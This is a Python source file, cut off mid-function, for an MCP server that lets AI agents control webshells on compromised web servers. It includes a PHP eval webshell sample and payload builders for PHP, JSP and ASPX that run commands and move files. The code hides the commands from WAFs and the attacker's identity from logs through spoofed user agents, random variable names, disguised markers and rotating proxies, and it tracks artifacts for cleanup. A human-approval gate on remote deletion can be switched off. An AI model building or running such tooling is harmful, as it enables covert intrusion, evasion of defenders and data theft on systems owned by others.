#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Webshell MCP —— ARTEX 的 WebShell 会话管理 MCP 服务器（纯 Python 标准库实现）

设计要点
--------
1. 传输：MCP stdio。协议部分与 /opt/artex/bin/recon_mcp.py 完全一致：首次收到报文
   自动判定帧格式（行分隔 JSON / Content-Length），并按同一格式回复；stdout 只允许
   出现协议帧，日志一律写文件（/var/log/webshell-mcp.log）。
2. 会话登记：/opt/artex/data/webshells.json，权限 600，结构
   {name: {url, type, password, method, header, note, created_at}}。
   password 是参数名（如 pass），不是口令；list 一律不返回它，也不返回自定义 header。
3. 载荷约定（决定了「远端要装什么马」）：
   - php     一句话 eval 马，例如 <?php @eval($_POST['pass']); ?>
             客户端把命令 base64 后塞进 `base64_decode('…')`，由 PHP 侧 system() 执行，
             ob_start 捕获输出，再用按会话派生的 <<标记>>…<<标记>> + base64 回传，
             客户端剥掉标记只留纯 stdout。这样 WAF 看不到明文命令，回显也不受马自身
             前后缀干扰。标记不含任何工具字样（按参数名 sha256 派生），响应被完整
             记录时也认不出是谁在打。
             如果远端其实不是 eval 型（HTTP 200 但无标记），自动回退到「base64 免杀马」
             模式，等价于 system(base64_decode($_POST['pass']))，并把判定结果缓存在进程内，
             后续同会话不再重复探测。
   - php_raw 代码执行马：cmd 直接当作 PHP 代码执行（外层同样加标记与 base64 捕获）。
   - jsp     命令型马：远端 Runtime.getRuntime().exec(request.getParameter('pass'))
   - aspx    命令型马：远端 Process.Start("cmd.exe", "/c " + 参数)
4. 上传分块：每块 ≤512KB（默认 512KB），逐块追加写入，避免超长请求被 WAF 拦。
   php/php_raw 会话用 PHP 文件函数（file_put_contents），不依赖远端 shell；
   jsp/免杀马走 `printf | base64 -d >>`，aspx 走 PowerShell 单行命令。
5. 下载：默认上限 2MB，超出截断并注明；内容能按文本解码就返回文本，否则返回 base64。
6. 健壮性：所有失败都返回 isError=true 的文本，绝不抛异常崩掉进程；错误信息包含
   HTTP 状态与响应前 200 字；任何日志都不写 password / header 值。
7. 内置 payload 库：/opt/artex/payloads/webshell/<type>/ 下放着预先写好的马（php / jsp /
   aspx），每个文件头部注释写明适用场景、所需权限、WAF 绕过点与改参数名的方法。
   payload_list 列清单，payload_get 取全文，agent 拿到后走文件上传漏洞落地即可，不必现场
   拼马。payload_get 做严格路径校验（禁止 .. / 绝对路径 / 反斜杠），并用 realpath 复核
   落点必须仍在库目录内。
"""

import base64
import hashlib
import json
import os
import re
import secrets
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------

SERVER_NAME = "Webshell"
SERVER_VERSION = "1.0.0"

DATA_DIR = "/opt/artex/data"
# 会话库与日志路径允许用环境变量覆盖：默认仍是生产路径，但端到端测试（起真 MCP
# 进程走 JSON-RPC 调工具）需要指向临时库——直接用真库会动生产数据。
STORE_PATH = (os.environ.get("ARTEX_WEBSHELL_STORE") or "").strip() or (DATA_DIR + "/webshells.json")
LOG_PATH = (os.environ.get("ARTEX_WEBSHELL_LOG") or "").strip() or "/var/log/webshell-mcp.log"

# 人工授权闸：agent 侧 shell_del 要删目标上的远端文件时，除了 remove_remote=true
# 还必须带 human_approved=true。页面（WebShell 功能页）里人工点的删除走 Go 侧
# API，不经过这里，不受影响。
# 环境变量 ARTEX_WEBSHELL_ALLOW_REMOTE_DELETE=1 可以整条关掉这道闸（默认开闸）。
ALLOW_REMOTE_DELETE = os.environ.get("ARTEX_WEBSHELL_ALLOW_REMOTE_DELETE", "1").strip() not in (
    "", "0", "off", "false", "no"
)

VALID_TYPES = ("php", "php_raw", "jsp", "aspx")

# 内置 payload 库：<根目录>/<type>/<file>，payload_get 只允许访问这下面
PAYLOAD_DIR = "/opt/artex/payloads/webshell"
PAYLOAD_TYPES = ("php", "jsp", "aspx")
# 文件头注释里的元信息标签：@summary / @scene / @perm / @bypass / @param / @mcp
PAYLOAD_META_RE = re.compile(r"@(summary|scene|perm|bypass|param|mcp)\s+(.+)")

# 兼容多种 MCP 协议版本：客户端报什么就回什么（在支持集内），否则回 2025-06-18
SUPPORTED_PROTOCOLS = ("2024-11-05", "2025-03-26", "2025-06-18", "2025-11-25")
DEFAULT_PROTOCOL = "2025-06-18"

# JSON-RPC 错误码
ERR_PARSE = -32700
ERR_INVALID_REQUEST = -32600
ERR_METHOD_NOT_FOUND = -32601
ERR_INVALID_PARAMS = -32602
ERR_INTERNAL = -32603

# 常见一句话马自带的回显前后缀（只收录不会误伤正常输出的经典标记）
MARKER_DIRT = ("->|", "|<-", "<-|", "|->")

CHUNK_MAX = 512 * 1024              # 单块上传上限 512KB
CHUNK_DEFAULT = 512 * 1024
UPLOAD_MAX = 32 * 1024 * 1024       # 单文件上限 32MB
DOWNLOAD_DEFAULT = 2 * 1024 * 1024  # 下载默认上限 2MB
DOWNLOAD_MAX = 64 * 1024 * 1024     # 下载上限 64MB（tool 参数夹紧用）
EXEC_OUTPUT_LIMIT = 100 * 1024      # exec 回显截断 100KB
HTTP_BODY_LIMIT = 16 * 1024 * 1024  # 单次响应最多读 16MB

# 默认 UA 用普通浏览器。以前自报 "ARTEX-Webshell-MCP/1.0"，目标侧日志里一眼就能
# 看出是谁在打；会话可用 user_agent 覆盖。
USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

# 全局默认出口代理：socks5h://[user:pass@]host:port 或 http://...
# 会话里的 proxy 优先，这里为空且会话也没配就直连。
PROXY_ENV = "ARTEX_WEBSHELL_PROXY"

# 会话名：允许中文，禁止控制字符与路径分隔符
NAME_RE = re.compile(r"^[^\x00-\x1f\x7f/\\]{1,64}$")
URL_RE = re.compile(r"^https?://", re.I)
ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

# 远端把「命令不存在」的错误当回显返回时，用这个识别「马类型不匹配」
SHELL_ERR_RE = re.compile(
    r"(?:^|\n)\s*(?:/bin/)?(?:sh|bash|dash|zsh):\s*.*(?:not found|Syntax error)"
    r"|command not found"
    r"|is not recognized as an internal or external command"
    r"|不是内部或外部命令",
    re.I,
)

# WAF / 网关拦截页特征（这类响应绝不能当成命令回显返回给 agent）
BLOCK_RE = re.compile(
    r"<!doctype\s+html|<html[\s>]|<head[\s>]|request rejected|access denied"
    r"|web application firewall|拦截|禁止访问|非法请求|\b403\b|\b406\b",
    re.I,
)

_log_lock = threading.Lock()
_store_lock = threading.Lock()
_cache_lock = threading.Lock()

# 进程内的载荷模式缓存：{会话名: "eval" | "raw"}
# 只影响性能（少发一次试探请求），不落盘；进程重启后重新探测。
_MODE_CACHE = {}


# ---------------------------------------------------------------------------
# 日志：只写文件，绝不污染 stdout（stderr 仅致命错误）
# ---------------------------------------------------------------------------

def log(msg):
    """把运行日志追加到文件；写失败也不能影响主流程。

    注意：调用方绝对不允许把 password / header 明文塞进 msg。
    """
    line = "%s [%d] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), os.getpid(), msg)
    try:
        with _log_lock:
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(line)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# stdio 帧读写：自适应「行分隔 JSON」与「Content-Length + JSON」
# （与 recon_mcp.py 完全一致，保证 ARTEX 的 Go 客户端行为统一）
# ---------------------------------------------------------------------------

class FramedReader:
    """从 stdin 读取 MCP 报文，自动判定帧格式。"""

    def __init__(self, stream):
        self.stream = stream
        self.mode = None  # None=未判定 / "line"=行分隔 / "header"=Content-Length

    def read_message(self):
        """读一条报文，返回 str（可能为空串或非法 JSON）；流结束返回 None。"""
        if self.mode == "line":
            return self._read_line()
        if self.mode == "header":
            return self._read_header_frame()
        return self._detect_and_read()

    def _read_line(self):
        while True:
            raw = self.stream.readline()
            if not raw:
                return None
            if raw.strip():
                return raw.decode("utf-8", "replace")

    def _detect_and_read(self):
        """判定帧格式：首个非空行若形如 Content-Length: 则走 header 模式。"""
        while True:
            raw = self.stream.readline()
            if not raw:
                return None
            stripped = raw.strip()
            if not stripped:
                continue
            if stripped.lower().startswith(b"content-length:"):
                self.mode = "header"
                log("帧格式判定: Content-Length 头模式")
                return self._read_header_frame(first_header=stripped)
            self.mode = "line"
            log("帧格式判定: 行分隔 JSON 模式（ARTEX 采用此格式）")
            return raw.decode("utf-8", "replace")

    def _read_header_frame(self, first_header=None):
        """读 Content-Length 风格的一帧。"""
        length = None
        pending = first_header
        while True:
            if pending is not None:
                raw, pending = pending, None
            else:
                raw = self.stream.readline()
                if not raw:
                    return None
            stripped = raw.strip()
            if not stripped:
                if length is None:
                    continue  # 头部还没读到 Content-Length，容忍空行
                break
            if stripped.lower().startswith(b"content-length:"):
                try:
                    length = int(stripped.split(b":", 1)[1].strip())
                except Exception:
                    length = None
        if not length or length <= 0:
            return ""
        buf = b""
        while len(buf) < length:
            chunk = self.stream.read(length - len(buf))
            if not chunk:
                break
            buf += chunk
        return buf.decode("utf-8", "replace")


class FramedWriter:
    """向 stdout 写出 MCP 报文，帧格式跟随读端判定结果。"""

    def __init__(self, stream):
        self.stream = stream
        self.mode = "line"

    def sync(self, mode):
        if mode:
            self.mode = mode

    def send(self, obj):
        data = json.dumps(obj, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
        if self.mode == "header":
            frame = b"Content-Length: %d\r\n\r\n" % len(data) + data
        else:
            frame = data + b"\n"
        try:
            self.stream.write(frame)
            self.stream.flush()
        except (BrokenPipeError, ValueError):
            # 客户端已关闭，安静退出
            raise SystemExit(0)


# ---------------------------------------------------------------------------
# 通用工具函数
# ---------------------------------------------------------------------------

class ToolError(Exception):
    """工具执行失败，消息会原样返回给 agent。"""


class ModeMismatch(ToolError):
    """远端的马不是预期的载荷类型（HTTP 200 但没回标记），调用方可降级重试。"""


def clamp(v, lo, hi):
    return max(lo, min(hi, v))


def as_int(value, default, lo, hi):
    """宽松取整：非法 → 默认值；越界 → 夹紧。"""
    try:
        n = int(value)
    except (TypeError, ValueError):
        try:
            n = int(float(value))
        except (TypeError, ValueError):
            n = default
    return clamp(n, lo, hi)


def brief(text, limit=200):
    """截断长文本用于错误摘要。"""
    t = (text or "").strip()
    t = ANSI_RE.sub("", t)
    t = re.sub(r"\s+\n", "\n", t)
    if len(t) > limit:
        t = t[:limit] + "…(已截断)"
    return t


def req_str(args, key, label=None):
    """取必填字符串参数。"""
    v = args.get(key)
    if isinstance(v, bool):
        v = None
    elif isinstance(v, (int, float)):
        v = str(v)
    if not isinstance(v, str) or not v.strip():
        raise ToolError("缺少必填参数 %s%s" % (key, ("（%s）" % label) if label else ""))
    return v.strip()


def opt_str(args, key, default=""):
    v = args.get(key)
    if v is None:
        return default
    if isinstance(v, (int, float)) and not isinstance(v, bool):
        v = str(v)
    if not isinstance(v, str):
        raise ToolError("参数 %s 必须是字符串" % key)
    return v.strip()


def b64e(data):
    """bytes → 无换行 base64 字符串。"""
    return base64.b64encode(data).decode("ascii")


def b64d(text):
    """宽松 base64 解码：去空白、补 padding、容忍 urlsafe 变体。"""
    s = re.sub(r"\s+", "", text or "")
    s = s.replace("-", "+").replace("_", "/")
    pad = (-len(s)) % 4
    if pad:
        s += "=" * pad
    return base64.b64decode(s)


def _decode_body(raw):
    """按 utf-8 → gb18030 → latin-1 依次尝试解码响应体。"""
    for enc in ("utf-8", "gb18030"):
        try:
            return raw.decode(enc, "strict")
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", "replace")


def _shq(path):
    """POSIX shell 单引号转义。"""
    return "'" + str(path).replace("'", "'\\''") + "'"


def _is_text(data):
    """判断字节串是不是「看起来像文本」（无 NUL，且能按 utf-8/gb18030 解码）。"""
    if not data:
        return True
    if b"\x00" in data[:8192]:
        return False
    for enc in ("utf-8", "gb18030"):
        try:
            data.decode(enc, "strict")
            return True
        except (UnicodeDecodeError, LookupError):
            continue
    return False


def _printable(data):
    """解码后是否基本是可打印文本（用于判断 base64 解出来的是不是真回显）。"""
    try:
        text = data.decode("utf-8", "strict")
    except (UnicodeDecodeError, LookupError):
        return False
    bad = sum(1 for ch in text if ord(ch) < 32 and ch not in "\r\n\t")
    return bad * 20 <= max(1, len(text))


# ---------------------------------------------------------------------------
# 会话存储（/opt/artex/data/webshells.json，权限 600）
# ---------------------------------------------------------------------------

def _load_store():
    """读会话库；文件不存在视为空库；损坏则抛 ToolError（不静默吞掉）。"""
    if not os.path.exists(STORE_PATH):
        return {}
    try:
        with open(STORE_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
    except json.JSONDecodeError as e:
        raise ToolError("会话库不是合法 JSON（%s）: %s" % (STORE_PATH, e))
    except OSError as e:
        raise ToolError("读取会话库失败（%s）: %s" % (STORE_PATH, e))
    if not isinstance(data, dict):
        raise ToolError("会话库结构非法（应为 {name: {...}}）: %s" % STORE_PATH)
    return data


def _save_store(data):
    """原子写会话库，并把权限强制为 600。"""
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        tmp = STORE_PATH + ".tmp"
        fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2, sort_keys=True)
            f.write("\n")
        os.replace(tmp, STORE_PATH)
        os.chmod(STORE_PATH, 0o600)
    except OSError as e:
        raise ToolError("写入会话库失败（%s）: %s" % (STORE_PATH, e))


def _get_session(name):
    """按名字取会话；不存在抛 ToolError。"""
    with _store_lock:
        store = _load_store()
    sess = store.get(name)
    if not isinstance(sess, dict):
        raise ToolError("会话不存在: %s（先用 shell_list 查看已登记会话）" % name)
    return sess


def _redact_url(url):
    """URL 里若把参数名写进 query（?pass=xxx），展示时把值打码，避免泄露。"""
    try:
        parts = urllib.parse.urlsplit(url)
        if not parts.query:
            return url
        pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        masked = [(k, "***") if k.lower() in ("pass", "password", "pwd", "cmd", "c")
                  else (k, v) for k, v in pairs]
        return urllib.parse.urlunsplit(
            (parts.scheme, parts.netloc, parts.path,
             urllib.parse.urlencode(masked), parts.fragment))
    except Exception:
        return url


def _mode_of(name):
    with _cache_lock:
        return _MODE_CACHE.get(name)


def _set_mode(name, mode):
    with _cache_lock:
        _MODE_CACHE[name] = mode


def _remember_artifact(name, remote_path):
    """记下经 shell_upload 写到远端的文件，shell_del 清痕迹时一并删除。

    只记路径不记内容；同一路径重复上传只保留一条，最多留 50 条（防会话库膨胀）。
    """
    remote_path = (remote_path or "").strip()
    if not remote_path:
        return
    with _store_lock:
        store = _load_store()
        sess = store.get(name)
        if not isinstance(sess, dict):
            return
        arts = sess.get("artifacts")
        if not isinstance(arts, list):
            arts = []
        if remote_path not in arts:
            arts.append(remote_path)
        sess["artifacts"] = arts[-50:]
        store[name] = sess
        _save_store(store)


# ---------------------------------------------------------------------------
# HTTP 层：所有请求带 timeout，跳过 TLS 证书校验（目标常是自签）
# ---------------------------------------------------------------------------

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE
_OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=_SSL_CTX))


# ---------------------------------------------------------------------------
# 出口隔离：会话级代理
#
# WebShell 请求以前是平台直连出去的，目标侧 nginx 日志里直接记着平台 IP，
# 一出事就是「顺着这个 IP 摸回来」。现在每条会话可以配一个出口（socks5h / http，
# 可带账密，也可以给一串让每次请求随机挑），没配就看全局 ARTEX_WEBSHELL_PROXY，
# 都没有才直连。
# ---------------------------------------------------------------------------

def proxy_pool(raw):
    """把「a,b,c」形式的代理池拆成列表（逗号/分号/空白分隔）。"""
    return [p for p in re.split(r"[,;\s]+", (raw or "").strip()) if p]


def proxy_of(sess):
    """取这条会话该用的出口。

    默认跟随平台代理：代理订阅里选中的节点由 sing-box 边车暴露在 127.0.0.1:7890，
    换节点时出口 IP 自动跟着变，不用改会话配置。边车没起就直连。
    会话可以显式指定别的代理（可给一串做池），或填 direct 强制直连。
    """
    raw = (sess.get("proxy") or "").strip()
    if raw.lower() in ("direct", "off", "none", "直连"):
        return ""
    if raw:
        return raw
    return platform_proxy() or (os.environ.get(PROXY_ENV) or "").strip()


# 平台代理边车（代理订阅里选的节点）固定监听的 mixed 端口。这个地址不变，
# 变的是背后的节点与出口 IP，所以不用跟着节点改配置。
PLATFORM_PROXY_ADDR = "127.0.0.1:7890"
_PLAT_CACHE = ("", 0.0)
_PLAT_LOCK = threading.Lock()


def platform_proxy():
    """平台代理在跑就返回其出口地址，否则返回空（直连）。

    用端口探测而不是查状态：边车进程还在但端口不通时照样发不出请求。
    结果缓存几秒，免得每个请求都连一次。
    """
    env = (os.environ.get("ARTEX_PLATFORM_PROXY") or "").strip()
    if env:
        if env.lower() in ("off", "direct", "none", "0"):
            return ""
        return env
    global _PLAT_CACHE
    now = time.time()
    with _PLAT_LOCK:
        val, at = _PLAT_CACHE
        if now - at < 5:
            return val
    val = ""
    addr = (os.environ.get("ARTEX_PLATFORM_PROXY_ADDR") or PLATFORM_PROXY_ADDR).strip()
    host, _, port = addr.rpartition(":")
    try:
        s = socket.create_connection((host or "127.0.0.1", int(port)), timeout=0.3)
        s.close()
        val = "socks5://" + addr
    except (OSError, ValueError):
        val = ""
    with _PLAT_LOCK:
        _PLAT_CACHE = (val, now)
    return val


def pick_proxy(raw, session_key="", rotate=False):
    """从代理池里挑一个。

    默认按会话稳定选（同一会话始终同一出口）：出口 IP 是会变的，如果一个马
    的请求老是换来源 IP，目标侧反而更容易注意到「同一个马被多个 IP 轮流访问」。
    只有显式 rotate=True（会话字段 proxy_rotate）才每次随机——那是拿来对冲
    「单个出口被封」的场景，不是默认。
    """
    pool = proxy_pool(raw)
    if not pool:
        return ""
    if len(pool) == 1:
        return pool[0]
    if rotate or not session_key:
        return secrets.choice(pool)
    h = hashlib.sha256(("p:" + session_key).encode("utf-8")).digest()
    return pool[int.from_bytes(h[:4], "big") % len(pool)]


def redact_proxy(raw):
    """把代理串里的账密换成 ***（列表与日志都必须走这个）。"""
    out = []
    for p in proxy_pool(raw):
        try:
            u = urllib.parse.urlsplit(p)
        except ValueError:
            out.append(p)
            continue
        if u.username or u.password:
            netloc = "%s:***@%s" % (u.username or "***", u.hostname or "")
            if u.port:
                netloc += ":%d" % u.port
            u = u._replace(netloc=netloc)
        out.append(urllib.parse.urlunsplit(u))
    return ",".join(out)


def validate_proxy(raw):
    """校验代理串格式；写错的配置在 shell_add 时就挡住。"""
    if (raw or "").strip().lower() in ("", "direct", "off", "none", "直连"):
        return
    for p in proxy_pool(raw):
        try:
            u = urllib.parse.urlsplit(p)
        except ValueError:
            raise ToolError("出口代理格式不对（%s）" % redact_proxy(p))
        if not u.hostname or not u.port:
            raise ToolError("出口代理要写到端口（%s），例：socks5h://127.0.0.1:1080" % redact_proxy(p))
        if (u.scheme or "").lower() not in ("socks5", "socks5h", "http", "https"):
            raise ToolError("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s" % u.scheme)


def egress_label(sess):
    """给用户看的实际出口描述：平台代理 / 显式代理（含池）/ 直连。"""
    p = proxy_of(sess)
    explicit = (sess.get("proxy") or "").strip()
    if not p:
        return "直连（会话强制）" if explicit else "直连（未起平台代理，目标能看到平台 IP）"
    pool = proxy_pool(p)
    picked = pick_proxy(p, (sess.get("url") or "").strip(), bool(sess.get("proxy_rotate")))
    label = redact_proxy(picked) if len(pool) > 1 else redact_proxy(p)
    if len(pool) > 1:
        label += "（%d 个池，%s）" % (len(pool), "每请求轮换" if sess.get("proxy_rotate") else "本会话固定")
    if not explicit:
        if p == "socks5://" + PLATFORM_PROXY_ADDR and not os.environ.get("ARTEX_PLATFORM_PROXY"):
            return "平台代理（随订阅节点变化）"
        return "平台代理 " + label
    return label


_OPENER_CACHE = {}


def _opener_for(sess):
    """按会话的出口配置造（并缓存）一个 opener。

    socks5/socks5h 走 PySocks，且一律远端解析域名（rdns），免得本地 DNS 把
    目标域名露给运营商；http/https 走 urllib 自带的 ProxyHandler。

    池的选择用会话 URL 当稳定键：同一会话永远同一出口，除非显式开了
    proxy_rotate。原因见 pick_proxy 的注释。
    """
    proxy_raw = proxy_of(sess)
    key = pick_proxy(proxy_raw, (sess.get("url") or "").strip(), bool(sess.get("proxy_rotate")))
    if not key:
        return _OPENER, "直连"
    if key in _OPENER_CACHE:
        return _OPENER_CACHE[key], redact_proxy(key)

    u = urllib.parse.urlsplit(key)
    scheme = (u.scheme or "").lower()
    if scheme in ("socks5", "socks5h"):
        try:
            import socks  # PySocks
            import sockshandler
        except ImportError:
            raise ToolError("配了 socks5 出口但缺少 PySocks（pip install PySocks），"
                            "或改用 http:// 代理")
        kwargs = {}
        if u.username:
            kwargs["username"] = u.username
            kwargs["password"] = u.password or ""
        handler = sockshandler.SocksiPyHandler(
            socks.SOCKS5, u.hostname, u.port, rdns=True, **kwargs)
        opener = urllib.request.build_opener(
            handler, urllib.request.HTTPSHandler(context=_SSL_CTX))
    elif scheme in ("http", "https"):
        proxy_url = key if scheme == "http" else key
        opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}),
            urllib.request.HTTPSHandler(context=_SSL_CTX))
    else:
        raise ToolError("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s" % u.scheme)

    _OPENER_CACHE[key] = opener
    return opener, redact_proxy(key)


def _post_payload(sess, payload, timeout, name=""):
    """发一次载荷请求，返回 (status, 响应文本)。

    HTTP 非 2xx / 网络错误 / 超时统一抛 ToolError，消息里带状态码与响应前 200 字。
    """
    url = (sess.get("url") or "").strip()
    if not url:
        raise ToolError("会话缺少 url")
    param = (sess.get("password") or "pass").strip() or "pass"
    method = (sess.get("method") or "POST").upper()

    headers = {
        "User-Agent": (sess.get("user_agent") or "").strip() or USER_AGENT,
        "Accept": "*/*",
        "Accept-Encoding": "identity",  # 不请求压缩，简化解析
        "Connection": "close",
    }
    custom = sess.get("header") or {}
    if isinstance(custom, dict):
        for k, v in custom.items():
            headers[str(k)] = str(v)

    qs = urllib.parse.urlencode({param: payload})
    if method == "GET":
        full = url + ("&" if "?" in url else "?") + qs
        req = urllib.request.Request(full, headers=headers, method="GET")
    else:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=qs.encode("utf-8"), headers=headers, method="POST")

    opener, _egress = _opener_for(sess)
    try:
        resp = opener.open(req, timeout=timeout)
        try:
            raw = resp.read(HTTP_BODY_LIMIT)
            status = getattr(resp, "status", None) or resp.getcode()
        finally:
            try:
                resp.close()
            except Exception:
                pass
    except urllib.error.HTTPError as e:
        try:
            body = e.read(65536) or b""
        except Exception:
            body = b""
        raise ToolError("远端返回 HTTP %d（%s）: %s"
                        % (e.code, url, brief(_decode_body(body), 200)))
    except (socket.timeout, TimeoutError):
        raise ToolError("请求超时（%ss）: %s" % (timeout, url))
    except urllib.error.URLError as e:
        raise ToolError("连接失败（%s）: %s" % (getattr(e, "reason", e), url))
    except Exception as e:
        raise ToolError("请求异常 %s: %s（%s）" % (type(e).__name__, e, url))

    if len(raw) >= HTTP_BODY_LIMIT:
        raise ToolError("响应超过 %d 字节上限，已中止（%s）" % (HTTP_BODY_LIMIT, url))

    text = _decode_body(raw)
    if status is None or status < 200 or status >= 300:
        raise ToolError("远端返回 HTTP %s: %s" % (status, brief(text, 200)))
    return status, text


# ---------------------------------------------------------------------------
# 载荷构造与回显清洗
# ---------------------------------------------------------------------------

def _php_names():
    """给一段生成的 PHP 代码取一组一次性变量名。

    以前固定用 $__artex_xxx，等于把工具名写在每个请求的 eval 代码里——WAF 解一次
    base64 就能认出是谁。现在每次生成随机后缀；嵌套的两段代码各自随机，26^5 的
    空间撞不上。
    """
    suf = "".join(secrets.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(5))
    return {
        "cmd": "$_" + suf + "c",
        "out": "$_" + suf + "o",
        "path": "$_" + suf + "p",
        "data": "$_" + suf + "d",
        "n": "$_" + suf + "n",
        "size": "$_" + suf + "s",
        "buf": "$_" + suf + "r",
        "self": "$_" + suf + "f",
        "inc": "$_" + suf + "g",
        "list": "$_" + suf + "l",
        "res": "$_" + suf + "v",
    }


def _markers(sess):
    """回显标记按会话生成：同一个马才认自己那对标记，且不含任何工具字样。

    标记只出现在请求/响应里，不进落地文件；用参数名派生，两端（Go 页面与这里）
    算法一致：sha256("m:"+参数名) 前 3 字节的 hex。以前是固定常量 <<ARTEXMKB>>，
    响应一旦被完整记录（WAF 日志、目标侧 nginx 日志）就等于自报家门。
    """
    key = (sess.get("password") or "pass").strip() or "pass"
    tag = hashlib.sha256(("m:" + key).encode("utf-8")).hexdigest()[:6]
    return "<<%sb>>" % tag, "<<%se>>" % tag


def _php_cmd_payload(cmd, sess):
    """type=php（eval 马）：base64 传输 + system() 执行 + 输出捕获 + 标记回传。"""
    b = b64e(cmd.encode("utf-8"))
    n = _php_names()
    mk_b, mk_e = _markers(sess)
    return ("%s=base64_decode('%s');"
            "ob_start();@system(%s);%s=ob_get_clean();"
            "echo '%s'.base64_encode(%s).'%s';"
            % (n["cmd"], b, n["cmd"], n["out"], mk_b, n["out"], mk_e))


def _php_code_payload(code, sess):
    """type=php_raw：把 cmd 直接当 PHP 代码执行，输出用同样的标记 + base64 捕获。"""
    c = (code or "").strip()
    if not c:
        raise ToolError("PHP 代码为空")
    if not c.endswith(";") and not c.endswith("}"):
        c += ";"
    n = _php_names()
    mk_b, mk_e = _markers(sess)
    return ("ob_start();" + c + "%s=ob_get_clean();" % n["out"] +
            "echo '%s'.base64_encode(%s).'%s';" % (mk_b, n["out"], mk_e))


def _php_write_code(remote_path, data, append):
    """拼 PHP 文件写入代码（外层再包 _php_code_payload）。"""
    p = b64e(remote_path.encode("utf-8"))
    d = b64e(data)
    n = _php_names()
    return ("%s=base64_decode('%s');%s=base64_decode('%s');"
            "%s=@file_put_contents(%s,%s,%s);"
            "echo (%s===false)?('ERR'):('OK:'.%s);"
            % (n["path"], p, n["data"], d, n["n"], n["path"], n["data"],
               "FILE_APPEND" if append else "0", n["n"], n["n"]))


def _php_read_code(remote_path, max_bytes):
    """拼 PHP 文件读取代码：回 'OK|原始大小|base64(内容)'。"""
    p = b64e(remote_path.encode("utf-8"))
    n = _php_names()
    return ("%s=base64_decode('%s');%s=@filesize(%s);"
            "%s=@file_get_contents(%s,false,null,0,%d);"
            "echo (%s===false)?('ERR'):('OK|'.%s.'|'.base64_encode(%s));"
            % (n["path"], p, n["size"], n["path"],
               n["buf"], n["path"], int(max_bytes), n["buf"], n["size"], n["buf"]))


def _ps_write_cmd(remote_path, data_b64, append):
    """aspx（Windows）写文件：PowerShell 单行命令，避免依赖 shell 重定向。"""
    p = str(remote_path).replace("'", "''")
    if append:
        body = ("$o=[IO.File]::ReadAllBytes('%s');"
                "[IO.File]::WriteAllBytes('%s',$o+[Convert]::FromBase64String('%s'))"
                % (p, p, data_b64))
    else:
        body = ("[IO.File]::WriteAllBytes('%s',[Convert]::FromBase64String('%s'))"
                % (p, data_b64))
    return 'powershell -NoProfile -NonInteractive -Command "%s"' % body


def _ps_read_cmd(remote_path, max_bytes):
    """aspx 读文件：回 'OK|原始大小|base64(内容)'。"""
    p = str(remote_path).replace("'", "''")
    body = ("$b=[IO.File]::ReadAllBytes('%s');$n=$b.Length;"
            "if($n -gt %d){$b=$b[0..(%d-1)]};"
            "Write-Output ('OK|'+$n+'|'+[Convert]::ToBase64String($b))"
            % (p, int(max_bytes), int(max_bytes)))
    return 'powershell -NoProfile -NonInteractive -Command "%s"' % body


def _extract_marked(text, sess):
    """从响应里抠出标记之间的 base64 并解码；没有标记返回 None。"""
    mk_b, mk_e = _markers(sess)
    if mk_b not in text or mk_e not in text:
        return None
    i = text.index(mk_b) + len(mk_b)
    j = text.find(mk_e, i)
    if j < 0:
        return None
    blob = text[i:j]
    try:
        return _decode_body(b64d(blob))
    except Exception as e:
        raise ToolError("标记内不是合法 base64（%s）: %s" % (type(e).__name__, brief(blob, 120)))


def _clean_plain(text, allow_b64=False):
    """清洗命令型马的回显：去标记、去 NUL、按需解 base64，只留 stdout。"""
    t = (text or "").replace("\x00", "")
    for m in MARKER_DIRT:
        t = t.replace(m, "")
    s = t.strip()
    if allow_b64 and len(s) >= 4 and re.fullmatch(r"[A-Za-z0-9+/=\s]+", s):
        try:
            dec = b64d(s)
            if dec and _printable(dec):
                t = _decode_body(dec)
        except Exception:
            pass
    return t.strip("\r\n")


def _looks_blocked(text):
    """响应是不是 WAF/网关拦截页（这类内容不能当回显返回）。"""
    return bool(BLOCK_RE.search(text or ""))


# ---------------------------------------------------------------------------
# 执行原语
# ---------------------------------------------------------------------------

def _exec_php(name, sess, cmd, timeout):
    """php / php_raw 会话执行：先按 eval 型探测，必要时回退到 base64 免杀马。"""
    typ = sess.get("type")
    cached = _mode_of(name)

    probe_text = None
    if cached != "raw":
        payload = _php_cmd_payload(cmd, sess) if typ == "php" else _php_code_payload(cmd, sess)
        _, text = _post_payload(sess, payload, timeout, name)
        inner = _extract_marked(text, sess)
        if inner is not None:
            _set_mode(name, "eval")
            return inner
        if _looks_blocked(text):
            raise ToolError("远端返回的是拦截页/非命令回显（HTTP 200）: %s" % brief(text, 200))
        if typ != "php":
            raise ToolError("远端未回标记，疑似不是 PHP 代码执行马；响应前 200 字: %s"
                            % brief(text, 200))
        probe_text = text  # 记下来，回退也失败时一并报出

    # 回退：base64 免杀马（远端等价于 system(base64_decode($_POST[pass]))）
    b = b64e((cmd or "").encode("utf-8"))
    _, text2 = _post_payload(sess, b, timeout, name)
    if _looks_blocked(text2):
